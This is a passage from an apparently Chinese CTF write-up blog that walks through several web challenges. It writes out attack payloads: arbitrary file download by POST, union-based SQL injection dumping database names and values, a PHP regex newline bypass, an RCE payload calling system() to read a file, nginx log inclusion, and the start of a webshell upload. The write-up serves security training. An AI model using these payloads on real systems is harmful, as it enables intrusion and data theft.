class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>存在一个<code>/FlagManager</code>路由，我们访问一下。</p><p><code>http://challenge.qsnctf.com:31780/DownloadServlet?filename=/WEB-INF/classes/com/ctf/flag/FlagManager.class</code></p><p>直接访问的话是无法下载的。</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423204245712.png" alt=" "></p><p>使用post下载</p><p><code>curl -X POST &quot;http://challenge.qsnctf.com:31780/DownloadServlet&quot; -d &quot;filename=/WEB-INF/classes/com/ctf/flag/FlagManager.class&quot; -o 1.class</code></p><p>然后拉入IDEA看源码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> com.ctf.flag;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlagManager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">FlagManager</span><span class="hljs-params">()</span> &#123;<br>    &#125; <span class="hljs-comment">//构造函数</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;Please input your flag: &quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> sc.next();<br>        System.out.println(<span class="hljs-string">&quot;Your input is: &quot;</span>);<br>        System.out.println(str);<br>        <span class="hljs-type">char</span>[] stringArr = str.toCharArray();<br>        Encrypt(stringArr);<br>    &#125;<span class="hljs-comment">//main方法，将输入的字符串转为字节数组使用Encrypt方法加密</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Encrypt</span><span class="hljs-params">(<span class="hljs-type">char</span>[] arr)</span> &#123;<br>        ArrayList&lt;Integer&gt; Resultlist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; ++i) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> arr[i] + <span class="hljs-number">38</span> ^ <span class="hljs-number">48</span>;<br>            Resultlist.add(result);<br>        &#125;<span class="hljs-comment">//做了一个加密：+38^48</span><br><br>        <span class="hljs-type">int</span>[] key = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">110</span>, <span class="hljs-number">107</span>, <span class="hljs-number">185</span>, <span class="hljs-number">183</span>, <span class="hljs-number">183</span>, <span class="hljs-number">186</span>, <span class="hljs-number">103</span>, <span class="hljs-number">185</span>, <span class="hljs-number">99</span>, <span class="hljs-number">105</span>, <span class="hljs-number">105</span>, <span class="hljs-number">187</span>, <span class="hljs-number">105</span>, <span class="hljs-number">99</span>, <span class="hljs-number">102</span>, <span class="hljs-number">184</span>, <span class="hljs-number">185</span>, <span class="hljs-number">103</span>, <span class="hljs-number">99</span>, <span class="hljs-number">108</span>, <span class="hljs-number">186</span>, <span class="hljs-number">107</span>, <span class="hljs-number">187</span>, <span class="hljs-number">99</span>, <span class="hljs-number">183</span>, <span class="hljs-number">109</span>, <span class="hljs-number">105</span>, <span class="hljs-number">184</span>, <span class="hljs-number">102</span>, <span class="hljs-number">106</span>, <span class="hljs-number">106</span>, <span class="hljs-number">188</span>, <span class="hljs-number">109</span>, <span class="hljs-number">186</span>, <span class="hljs-number">111</span>, <span class="hljs-number">188</span>&#125;;<br>        ArrayList&lt;Integer&gt; Keylist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; key.length; ++j) &#123;<br>            Keylist.add(key[j]);<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;Result: &quot;</span>);<br>        <span class="hljs-keyword">if</span> (Resultlist.equals(Keylist)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Congratulations! &quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;Error! &quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>那么我们写脚本逆一下就行了<code>^48-38</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-number">110</span>, <span class="hljs-number">107</span>, <span class="hljs-number">185</span>, <span class="hljs-number">183</span>, <span class="hljs-number">183</span>, <span class="hljs-number">186</span>, <span class="hljs-number">103</span>, <span class="hljs-number">185</span>, <span class="hljs-number">99</span>, <span class="hljs-number">105</span>, <span class="hljs-number">105</span>, <span class="hljs-number">187</span>, <span class="hljs-number">105</span>, <span class="hljs-number">99</span>, <span class="hljs-number">102</span>, <span class="hljs-number">184</span>, <span class="hljs-number">185</span>, <span class="hljs-number">103</span>, <span class="hljs-number">99</span>, <span class="hljs-number">108</span>, <span class="hljs-number">186</span>, <span class="hljs-number">107</span>, <span class="hljs-number">187</span>, <span class="hljs-number">99</span>, <span class="hljs-number">183</span>, <span class="hljs-number">109</span>, <span class="hljs-number">105</span>, <span class="hljs-number">184</span>, <span class="hljs-number">102</span>, <span class="hljs-number">106</span>, <span class="hljs-number">106</span>, <span class="hljs-number">188</span>, <span class="hljs-number">109</span>, <span class="hljs-number">186</span>, <span class="hljs-number">111</span>, <span class="hljs-number">188</span>]<br><br>flag=[]<br><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key:<br>    decrypted_key = (k ^ <span class="hljs-number">48</span>) - <span class="hljs-number">38</span> <br>    flag.append(<span class="hljs-built_in">chr</span>(decrypted_key))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;FLAG: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(flag)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210053393.png"></p><hr><h3 id="商师一日游"><a href="#商师一日游" class="headerlink" title="商师一日游"></a>商师一日游</h3><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210214856.png"></p><p>访问<code>/atc1acrd.html</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210243567.png"></p><p>查看source？应该是源代码。</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210256979.png"></p><p>获取一部分flag哈哈<code>flag&#123;a</code> 与一个新的页面<code>atc2cnzd.php</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210335272.png"></p><p>构造一块曲奇饼? <code>cookie: fish=strong</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210431389.png"></p><p><code>8f3b</code>与<code>atc3oklm.php</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210508350.png"></p><p>看一下响应包 </p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210538240.png"></p><p><code>37634d</code>和<code>atc4zztg.php</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210604399.png"></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210614069.png"></p><p><code>a47e4aa</code>和<code>atc5uupl.php</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210641123.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hhh&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/im&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<span class="hljs-comment">//必须以php开头，忽略大小写且支持多行模式</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<span class="hljs-comment">//必须php开头，且忽略大小写，但此处如果以php开头则会输出 hacker</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> xxxxxxxxxxx;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonononono&#x27;</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>代码很简单啦，使用换行就行。</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210851419.png"></p><blockquote><p>payload <code>?hhh=%0aphp</code></p></blockquote><p><code>8146b701</code>和<code>atc6ertg.php</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210931090.png"></p><p>由于前端代码的缘故无法点击，修改前端代码。</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423210954485.png"></p><p>可以给<code>disabled</code>删了</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423211011317.png"></p><p><code>c97c5</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423211029194.png"></p><p>rce，来找flag在哪吧。</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423211121514.png"></p><blockquote><p> payload: <code>memory=system(&#39;cat Tourist_fragment7 &#39;);</code></p><p>flag: flag{a8f3b37634da47e4aa8146b701c97c5b}</p></blockquote><hr><h3 id="小小查询系统"><a href="#小小查询系统" class="headerlink" title="小小查询系统"></a>小小查询系统</h3><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423211358100.png"></p><p>sql注入。</p><h4 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h4><p><code>?id=1&#39; order by 4--+</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423211626486.png"></p><p>字段为3</p><h4 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h4><p><code>?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423212225318.png"></p><h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;ctf&#39;--+</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423212257964.png"></p><h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><p><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;ctf&#39; and table_name=&#39;flag&#39;--+</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423212323132.png"></p><h4 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h4><p><code>?id=-1&#39; union select 1,group_concat(value),3 from ctf.flag--+</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423212352146.png"></p><hr><h3 id="baby-include"><a href="#baby-include" class="headerlink" title="baby include"></a>baby include</h3><p>文件包含 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;look&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// Great, it&#x27;s the file inclusion master, we have a save !!!</span><br>    <span class="hljs-variable">$look</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;look&#x27;</span>];<br>    <span class="hljs-variable">$look</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;!!!&quot;</span>, <span class="hljs-variable">$look</span>);<br>    <span class="hljs-variable">$look</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;!!!&quot;</span>, <span class="hljs-variable">$look</span>);<br>    <span class="hljs-variable">$look</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;filter&quot;</span>, <span class="hljs-string">&quot;!!!&quot;</span>, <span class="hljs-variable">$look</span>);<br>    <span class="hljs-variable">$look</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;input&quot;</span>, <span class="hljs-string">&quot;!!!&quot;</span>, <span class="hljs-variable">$look</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$look</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>过滤的确实有点多的，但是少了日志。</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423212538143.png"></p><p>nginx服务器，尝试日志包含。</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423212613610.png"></p><p>读取flag</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423212640604.png"></p><hr><h3 id="Input-a-number"><a href="#Input-a-number" class="headerlink" title="Input a number"></a>Input a number</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sqctf&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sqctf&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">114514</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;逸一时, 误一世!&quot;</span>);<br>    &#125;<span class="hljs-comment">//不能是114514</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">114514</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看看你输入的数字: &quot;</span>.<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>考察点是php中的<code>intval</code>特性。</p><p>这里可以用小数绕过。</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423213043836.png"></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423213057288.png"></p><hr><h3 id="My-Blog"><a href="#My-Blog" class="headerlink" title="My Blog"></a>My Blog</h3><p>进入博客点击下功能点 </p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423213152339.png"></p><p>点击<code>GitHub</code>会跳转到一个pdf </p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423213211854.png"></p><p>最下面有一个账号密码<code>admin:secret123</code></p><p>访问<code>robots.txt</code>得到登录界面 </p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423213251640.png"></p><p>登录成功获得flag </p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423213312305.png"></p><hr><h3 id="Upload-Level1"><a href="#Upload-Level1" class="headerlink" title="Upload_Level1"></a>Upload_Level1</h3><p>文件上传，抓包看看什么过滤。</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423213426566.png"></p><p>看起来没过滤。。</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423213441367.png"></p><p>那么上传木马。</p><p><img 